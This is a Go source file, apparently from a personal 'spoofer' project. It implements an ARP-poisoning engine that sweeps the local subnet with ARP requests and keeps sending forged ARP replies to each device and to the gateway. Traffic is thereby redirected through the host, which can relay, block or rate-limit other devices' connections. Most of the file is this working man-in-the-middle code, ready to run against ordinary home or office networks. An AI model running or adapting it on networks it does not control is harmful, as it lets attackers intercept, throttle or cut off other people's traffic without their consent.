package engine

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"crypto/sha256"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	"github.com/gopacket/gopacket/pcap"

	"github.com/miekg/dns"
)

type nameCh struct {
	name string
	ip   string
	mac  string
}

// TODO:
// 1. gracefull shutdowns
// 2. make logs
// 3. persistant data
// 4. windows port

type DeviceMap struct {
	Devices map[string]*Device
	mu      *sync.RWMutex
}

// type BlockedDevices struct {
// 	ds map[string]bool
// 	mu *sync.RWMutex
// }

// look into this
func (d *Device) tick() {
	now := time.Now()
	if d.lastMeasure.IsZero() {
		d.prevBytesSent = d.BytesSent
		d.prevBytesRecv = d.BytesReceived
		d.lastMeasure = now
		return
	}
	elapsed := now.Sub(d.lastMeasure).Seconds()
	if elapsed < 0.001 {
		return
	}
	d.UpRate = float64(d.BytesSent-d.prevBytesSent) / elapsed
	d.DownRate = float64(d.BytesReceived-d.prevBytesRecv) / elapsed
	d.prevBytesSent = d.BytesSent
	d.prevBytesRecv = d.BytesReceived
	d.lastMeasure = now
}

func (d Device) String() string {
	return fmt.Sprintf("Name: %s, IP: %s, MAC: %s, Interface: %s, Reachable: %t, Mask: %s, UpRate: %.2f, DownRate: %.2f", d.Name,
		d.IP.String(), net.HardwareAddr(d.MAC).String(), d.Interface, d.Reachable, d.Mask.MaskIP.String(), d.UpRate, d.DownRate)
}

type Engine struct {
	Devices DeviceMap
	Host    Device
}

type gateway struct {
	ip  net.IP
	mac net.HardwareAddr
}

var gateWay atomic.Pointer[gateway]

func (e *Engine) DevicesSnapshot() []Device {
	if e.Devices.mu == nil {
		return nil
	}
	e.Devices.mu.RLock()
	defer e.Devices.mu.RUnlock()
	out := make([]Device, 0, len(e.Devices.Devices))
	for _, d := range e.Devices.Devices {
		out = append(out, *d)
	}
	return out
}

func (e *Engine) DeviceByIP(ip string) (*Device, bool) {
	if e.Devices.mu == nil {
		return nil, false
	}
	e.Devices.mu.RLock()
	defer e.Devices.mu.RUnlock()
	for _, d := range e.Devices.Devices {
		if d.IP.String() == ip {
			return d, true
		}
	}
	return nil, false
}

func (e *Engine) BlockDevice(d *Device) error {
	e.Devices.mu.Lock()
	defer e.Devices.mu.Unlock()
	err := cleanDeviceForwardBlock(d)
	if err != nil {
		return err
	}
	return setDeviceForwardBlock(d, true)
}

func (e *Engine) RateLimitDevice(ip string, filter string, bitRateF float64) error {
	// panic(fmt.Sprintf("rate limit not implemented for %s, filter: %s, rate: %f", ip, filter, bitRateF))
	if bitRateF == 0.0 {
		return removeRateLimit(e.Host.Interface, ip, filter)
	}
	rate := strconv.FormatFloat(bitRateF, 'f', -1, 64) + "kbit"
	switch filter {
	case "up":
		return addRateLimit(e.Host.Interface, ip, filter, rate)
	case "down":
		return addRateLimit(e.Host.Interface, ip, filter, rate)
	}
	return nil
}

func (e *Engine) CleanDeviceBlock(d *Device) error {
	return cleanDeviceForwardBlock(d)
}

func (e *Engine) UnblockDevice(d *Device) error {
	e.Devices.mu.Lock()
	defer e.Devices.mu.Unlock()
	return setDeviceForwardBlock(d, false)
}

func blockForwardingForDev(ifaces []string) {
	err := SetNetworkForwardState(ifaces, FORWARD_DROP)
	if err != nil {
		log.Fatal(err)
	}
	state := GetNetworkForwardState(ifaces)
	if state != FORWARD_DROP {
		// panic("forwarding state is not drop: " + state)
		log.Fatal("forwarding state is not drop")
	}
}

// 1. setup rcv loop //listens for replys from the send loop but we set it up first so we don't miss any replys // device chanel
// 2. setup send loop // send arp requests to all available ips on the network
// 3. setup poison loop // send forged replys to spoof
// 4. setup measure loop // measure rate up and down
func Start(e *Engine) {
	host := getHost()
	e.Host = host
	fmt.Printf("host %s", host.String())
	ds := DeviceMap{
		Devices: make(map[string]*Device),
		mu:      &sync.RWMutex{},
	}
	e.Devices = ds
	handle, err := pcap.OpenLive(host.Interface, 1600, true, 1000*time.Millisecond)
	if err != nil {
		panic("Error opening device: " + err.Error())
	}
	if host.Reachable == false {
		panic("No active interface found")
	}
	defer handle.Close()

	ifaces := []string{host.Interface, host.IfaceFriendly}
	log.Println(ifaces)
	// blockForwardingForDev(ifaces)
	err = setup(ifaces, host)
	if err != nil {
		panic(err)
	}

	errChan := make(chan error)
	deviceCh := make(chan *Device)
	nameChan := make(chan nameCh)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go arpRCV(deviceCh, host, handle, ctx, errChan)
	go arpSendRequests(host, handle, ctx, errChan)
	go arpSendForgedReplys(ds, host, handle, ctx, errChan)
	go Relay(ds, host, ctx, errChan)

	timer := time.Minute * 5
	ticker := time.NewTicker(timer)
	for {
		select {
		case <-ctx.Done():
			TeardownLimiter(host.Interface)
			return
		case err := <-errChan:
			log.Println("Error:", err)
		case <-ticker.C:
			ds.mu.Lock()
			for _, d := range ds.Devices {
				if d.lastSeen.Add(timer).Before(time.Now()) {
					if !d.Blocked {
						delete(ds.Devices, createDeviceHash(d.IP.String(), net.HardwareAddr(d.MAC).String()))
					}
				}
			}
			ds.mu.Unlock()
		case name := <-nameChan:
			ds.mu.Lock()
			hash := createDeviceHash(name.ip, name.mac)
			dv, ok := ds.Devices[hash]
			if ok {
				dv.Name = name.name
			}
			ds.mu.Unlock()
		case device := <-deviceCh:
			ds.mu.Lock()
			ip := device.IP.String()
			if net.HardwareAddr(device.MAC).String() == net.HardwareAddr(host.MAC).String() {
				panic(fmt.Sprintf("SELF-POISONED DEVICE:%s %s", device.IP, net.HardwareAddr(host.MAC).String()))
			}
			mac := net.HardwareAddr(device.MAC).String()
			hash := createDeviceHash(ip, mac)
			if existing, ok := ds.Devices[hash]; ok {
				existing.lastSeen = time.Now()
			} else {
				ds.Devices[hash] = device
				go getDeviceName(nameChan, ip, mac)
			}
			ds.mu.Unlock()
		}
	}
}

func maxSubnet(host Device) []byte {
	invertedMask := make(net.IPMask, len(host.Mask.Mask))
	copy(invertedMask, host.Mask.Mask)
	invertedMask[0] = ^invertedMask[0]
	invertedMask[1] = ^invertedMask[1]
	invertedMask[2] = ^invertedMask[2]
	invertedMask[3] = ^invertedMask[3]
	maxSub := make([]byte, len(invertedMask))

	for i := range invertedMask {
		maxSub[i] = invertedMask[i] | host.IP[i]
	}
	return maxSub
}

func arpSendRequests(host Device, handle *pcap.Handle, ctx context.Context, errChan chan error) {
	ip := host.IP.Mask(host.Mask.Mask).To4()
	maxSub := maxSubnet(host)

	fmt.Printf("Max Subnet: %s\n", net.IP(maxSub).String())
	fmt.Printf("IP: %s\n", ip.String())
	fmt.Println("interfa", host.Interface)
	// send arp packets per ip in subnet
	//
	// TODO: should be done ina goroutine with a 5s ticker
	tk := time.NewTicker(time.Second * 5)
	for {
		select {
		case <-ctx.Done():
			return
		case <-tk.C:
			for {
				if ip.Equal(net.IP(maxSub)) {
					break
				}

				if ip.Equal(host.IP) {
					incrementIP(ip)
					continue
				}

				err := arpSendOperation(
					net.HardwareAddr(host.MAC),
					net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
					host.MAC,
					net.HardwareAddr{0, 0, 0, 0, 0, 0},
					host.IP,
					ip,
					layers.ARPRequest,
					handle,
				)
				// TODO: buld a log
				if err != nil {
					log.Println("Error sending packet:", err)
				}

				incrementIP(ip)
			}
		}
	}
}

func arpSendForgedReplys(devices DeviceMap, host Device, handle *pcap.Handle, ctx context.Context, errChan chan error) {
	ticker := time.NewTicker(time.Second * 2)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			gw := gateWay.Load()
			if gw == nil {
				continue
			}
			// the two loops above
			devices.mu.RLock()
			isLocalIp := func(ip net.IP) bool {
				for _, hostIfaceIp := range hostIfacesIp {
					if hostIfaceIp.Equal(ip) {
						return true
					}
				}
				return false
			}
			for _, device := range devices.Devices {
				if device.IP.Equal(host.IP) || isLocalIp(device.IP) || device.IP.Equal(gw.ip) {
					continue
				}
				err := arpSendOperation(
					net.HardwareAddr(host.MAC),
					net.HardwareAddr(device.MAC),
					host.MAC,
					device.MAC,
					gw.ip,
					device.IP,
					layers.ARPReply,
					handle,
				)
				if err != nil {
					errChan <- err
					log.Println("Error sending reply:", err)
				}

				err = arpSendOperation(
					net.HardwareAddr(host.MAC),
					gw.mac,
					host.MAC,
					gw.mac,
					device.IP,
					gw.ip,
					layers.ARPReply,
					handle,
				)

				if err != nil {
					errChan <- err
					log.Println("Error sending reply to gate way:", err)
				}
			}
			devices.mu.RUnlock()
		}
	}

}

// rcv goroutine
func arpRCV(deviceCh chan *Device, host Device, handle *pcap.Handle, ctx context.Context, errChan chan error) {
	packetSource := gopacket.NewPacketSource(
		handle,
		handle.LinkType(),
	)
	packetsCh := packetSource.PacketsCtx(ctx)

	for {
		for packet := range packetsCh {
			arpLayer := packet.Layer(layers.LayerTypeARP)
			// TODO: skip packets sent by us
			//
			if arpLayer == nil {
				continue
			}
			arp := arpLayer.(*layers.ARP)

			srcMAC := net.HardwareAddr(arp.SourceHwAddress)
			if len(arp.SourceProtAddress) != net.IPv4len {
				continue
			}
			srcIP := net.IP(arp.SourceProtAddress)
			if srcIP.Equal(net.IPv4zero) {
				continue
			} // DAD probes
			if srcMAC.String() == "00:00:00:00:00:00" {
				continue
			} // probes / unanswered
			if srcMAC.String() == net.HardwareAddr(host.MAC).String() {
				continue
			} // ours
			if srcIP.Equal(host.IP) {
				continue
			}
			if gateWay.Load() == nil && srcIP.Equal(net.ParseIP("192.168.1.1")) {
				gateWay.Store(&gateway{ip: srcIP, mac: srcMAC})
				fmt.Println("found gateway" + fmt.Sprintf("%s %s", srcIP.String(), srcMAC.String()))
			}
			device := &Device{
				IP:        net.IP(arp.SourceProtAddress),
				MAC:       net.HardwareAddr(arp.SourceHwAddress),
				Reachable: true,
				lastSeen:  time.Now(),
				Mask: Mask{
					MaskIP: host.Mask.MaskIP,
					Mask:   host.Mask.Mask,
				},
			}

			deviceCh <- device
			// TODO: remove this
			fmt.Printf(
				"ARP: %s (%s) -> %s (%s), op=%d\n",
				device.IP.String(),
				net.HardwareAddr(device.MAC).String(),
				net.IP(arp.DstProtAddress).String(),
				net.HardwareAddr(arp.DstHwAddress).String(),
				arp.Operation,
			)
		}
		select {
		case <-ctx.Done():
			return
		}
	}
}

func getVendor(mac string) string {
	prefix := strings.ToUpper(strings.ReplaceAll(mac, ":", ""))[:6]

	f, err := os.Open("/home/saif/Dev/personal-projects/GolangPrrrr/spoofer/data/ieee-oui.txt") // FIX: don't hard code this
	if err != nil {
		return "Unknown"
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		line := scanner.Text()

		if strings.HasPrefix(strings.ToUpper(line), prefix) {
			parts := strings.Fields(line)

			if len(parts) >= 2 {
				return strings.Join(parts[1:], " ")
			}
		}
	}

	return ""
}

// TODO: start a goroutine to resolve the name with lookup addr, mdns, llmnr ..etc, and listen for changes later
func getDeviceName(nameChan chan nameCh, ip string, mac string) {
	var name string
	names, err := net.LookupAddr(ip)
	if err == nil && len(names) > 0 {
		name = strings.TrimSuffix(names[0], ".")
	}
	name = getVendor(mac)
	if name == "" {
		name = "Unknown"

	}
	nameChan <- nameCh{name: name, ip: ip, mac: mac}
	// if name, err := reverseMDN(ip); err == nil {
	// 	d.Name = name
	// 	return
	// }
}

var hostIfacesIp []net.IP

func reverseMDNS(ip string) (string, error) {
	addr := net.ParseIP(ip).To4()
	if addr == nil {
		return "", fmt.Errorf("invalid IPv4: %s", ip)
	}
	q := fmt.Sprintf("%d.%d.%d.%d.in-addr.arpa.", addr[3], addr[2], addr[1], addr[0])

	msg := new(dns.Msg)
	msg.SetQuestion(q, dns.TypePTR)
	msg.RecursionDesired = false
	b, err := msg.Pack()
	if err != nil {
		return "", err
	}

	pc, err := net.ListenPacket("udp4", ":0") // unconnected, non-5353 port
	if err != nil {
		return "", err
	}
	defer pc.Close()

	for _, dst := range []string{ip + ":5353", "224.0.0.251:5353"} {
		if ua, err := net.ResolveUDPAddr("udp4", dst); err == nil {
			pc.WriteTo(b, ua)
		}
	}

	pc.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 1500)
	for {
		n, _, err := pc.ReadFrom(buf)
		if err != nil {
			return "", err
		}
		var resp dns.Msg
		if resp.Unpack(buf[:n]) != nil {
			continue
		}
		for _, rr := range resp.Answer {
			if ptr, ok := rr.(*dns.PTR); ok && strings.EqualFold(ptr.Hdr.Name, q) {
				return strings.TrimSuffix(ptr.Ptr, "."), nil
			}
		}
	}
}

func createDeviceHash(ip string, mac string) string {
	hash := sha256.New()
	_, err := hash.Write([]byte(ip))
	if err != nil {
		fmt.Println("Error creating hash:", err)
		return ""
	}
	_, err = hash.Write([]byte(mac))
	if err != nil {
		fmt.Println("Error creating hash:", err)
		return ""
	}
	return fmt.Sprintf("%x", hash.Sum(nil))
}

func incrementIP(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] > 0 {
			break
		}
	}
}

// A warapper used to build arp packets for both req and reply
// see https://github.com/google/gopacket/blob/master/layers/arp.go
func arpSendOperation(srcMac, dstMac, srcHwAddr, dstHwAddr net.HardwareAddr,
	srcIp, dstIp net.IP,
	arpOpType uint16,
	handle *pcap.Handle) error {
	ethLayer := &layers.Ethernet{
		SrcMAC:       srcMac,
		DstMAC:       dstMac,
		EthernetType: layers.EthernetTypeARP,
	}

	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         arpOpType,
		SourceHwAddress:   srcHwAddr,
		SourceProtAddress: srcIp.To4(),
		DstHwAddress:      dstHwAddr,
		DstProtAddress:    dstIp.To4(),
	}

	var err error
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	err = gopacket.SerializeLayers(buffer, options, ethLayer, arpLayer)
	if err != nil {
		return err
	}
	outboundPacket := buffer.Bytes()
	err = handle.WritePacketData(outboundPacket)
	if err != nil {
		return err
	}
	return err
}

// TODO : find a better way to combine both of the ways we get the info here
func getHost() Device {
	host := Device{}
	fmt.Println(host.String())
	hostname, _ := os.Hostname()
	host.Name = hostname

	// Dial a UDP address to find the active outbound IP.
	// This does not actually send any network packets or require an internet connection.
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		fmt.Println("Error identifying active interface:", err)
		return host
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	activeIP := localAddr.IP

	interfaces, err := net.Interfaces()
	if err != nil {
		fmt.Println("Error reading interfaces:", err)
		return host
	}

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP.To4()
			case *net.IPAddr:
				ip = v.IP.To4()
			}

			if ip != nil && ip.Equal(activeIP) {
				host.Interface = iface.Name
				host.IfaceFriendly = iface.Name
				host.Reachable = true
				host.IP = ip.To4()
				if iface.HardwareAddr.String() != "" {
					host.MAC = iface.HardwareAddr
				}
			}
		}
	}

	stringIface := func(iface pcap.Interface) string {
		var b strings.Builder

		fmt.Fprintf(&b, "Name: %s, Description: %s", iface.Name, iface.Description)

		for _, addr := range iface.Addresses {
			fmt.Fprintf(&b, "\n  IP: %s, Netmask: %s", addr.IP, addr.Netmask)
		}

		return b.String()
	}
	// NOTE : will this work on linux and windows?
	ifs, _ := pcap.FindAllDevs()
	for _, iface := range ifs {
		log.Println("ifs", stringIface(iface))
		for _, addr := range iface.Addresses {
			hostIfacesIp = append(hostIfacesIp, addr.IP)
			if addr.IP.Equal(host.IP) {
				host.Interface = iface.Name
				host.Mask.MaskIP = net.IP(addr.Netmask)
				host.Mask.Mask = addr.Netmask
			}
		}
	}

	return host
}
